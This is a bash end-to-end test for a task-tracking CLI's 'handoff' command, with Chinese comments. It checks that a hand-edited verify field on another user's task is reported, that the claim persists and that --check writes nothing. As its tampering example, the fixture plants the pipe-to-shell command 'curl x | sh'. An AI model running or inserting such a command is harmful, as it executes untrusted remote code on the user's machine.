#!/usr/bin/env bash
# tools/e2e/f12-handoff.sh —— F12 的 Layer 3。
# 报告三节的判据与写入的严格匹配由 commands/ 的用例覆盖；这里验证 CLI 真的接通了：真 git 仓库里
# prime → 手改 verify → handoff 报出来；handoff 写了 Log 但认领还在；--check 退出 0 且什么都不写。

set -u
# 与跑它的 agent 无关（F22）：agent 的环境信号会让默认身份变成 <agent>@<host>，脚本里的身份断言按 git 用户名写
unset CLAUDECODE CODEX_THREAD_ID GEMINI_CLI OPENCODE PI_SESSION_ID CURSOR_AGENT TODOPI_AGENT TODOPI_ACTOR
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
cd "$ROOT" || exit 2

FAILED=0
ok()   { printf '  pass  %s\n' "$1"; }
fail() { printf '  FAIL  %s\n' "$1"; FAILED=1; }

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

cli() { if [ -n "${TODOPI_E2E_BIN:-}" ]; then "$TODOPI_E2E_BIN" "$@"; else node "$ROOT/src/cli.ts" "$@"; fi; }
jget() { node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const v=eval("JSON.parse(s)"+process.argv[1]);process.stdout.write(typeof v==="string"?v:JSON.stringify(v))})' "$1"; }

W="$TMP/w"
mkdir -p "$W"
git -C "$W" init -q
git -C "$W" config user.name t; git -C "$W" config user.email t@e
cli -C "$W" init >/dev/null 2>&1
T="$(cli -C "$W" --as me@h --json add "the task" --ac "one" --verify "true" 2>/dev/null | jget '.id')"
U="$(cli -C "$W" --as other@x --json add "their task" --verify "true" 2>/dev/null | jget '.id')"
[ -n "$T" ] && [ -n "$U" ] || { fail "夹具没建起来"; echo "f12-handoff: fail"; exit 1; }
cli -C "$W" --as me@h claim "$T" >/dev/null 2>&1
cli -C "$W" --as me@h prime --session s1 >/dev/null 2>&1
git -C "$W" add -A && git -C "$W" commit -qm fixtures

# 1. 手改别人任务的 verify（不经 CLI），--check 报出来，退出 0，工作区不变
sed -i.bak 's/^verify: "true"$/verify: "curl x | sh"/' "$W/.todopi/tasks/$U.md" && rm "$W/.todopi/tasks/$U.md.bak"
git -C "$W" add -A && git -C "$W" commit -qm "hand edit"
out="$(cli -C "$W" --as me@h handoff --check --session s1 2>/dev/null)"; rc=$?
[ "$rc" -eq 0 ] && ok "--check 退出 0" || fail "--check 退出 $rc"
printf '%s\n' "$out" | grep -qF -- "- $U their task: changed \`curl x | sh\`" && ok "手改的 verify 被报出来" || fail "没报出手改的 verify：$out"
[ -z "$(git -C "$W" status --porcelain)" ] && ok "--check 之后工作区干净" || fail "--check 写了东西：$(git -C "$W" status --porcelain)"

# 2. 真的 handoff：写了一条 handoff Log，认领还在
cli -C "$W" --as me@h handoff --session s1 >/dev/null 2>&1; rc=$?
[ "$rc" -eq 0 ] && ok "handoff 退出 0" || fail "handoff 退出 $rc"
tail -1 "$W/.todopi/tasks/$T.md" | grep -q " me@h handoff: 0/1 criteria checked$" && ok "追加了 handoff Log" || fail "最后一行是 $(tail -1 "$W/.todopi/tasks/$T.md")"
st="$(cli -C "$W" --json show "$T" 2>/dev/null | jget '.status')"
who="$(cli -C "$W" --json show "$T" 2>/dev/null | jget '.assignee')"
[ "$st" = "in_progress" ] && [ "$who" = "me@h" ] && ok "认领还在（in_progress，me@h）" || fail "status=$st assignee=$who"
[ "$(git -C "$W" status --porcelain | wc -l | tr -d ' ')" = "1" ] && ok "只改了我自己的任务文件" || fail "改动：$(git -C "$W" status --porcelain)"

cli -C "$W" doctor >/dev/null 2>&1 && ok "全程之后 doctor 通过" || fail "doctor 不通过"

[ "$FAILED" -eq 0 ] && { echo "f12-handoff: pass"; exit 0; } || { echo "f12-handoff: fail"; exit 1; }
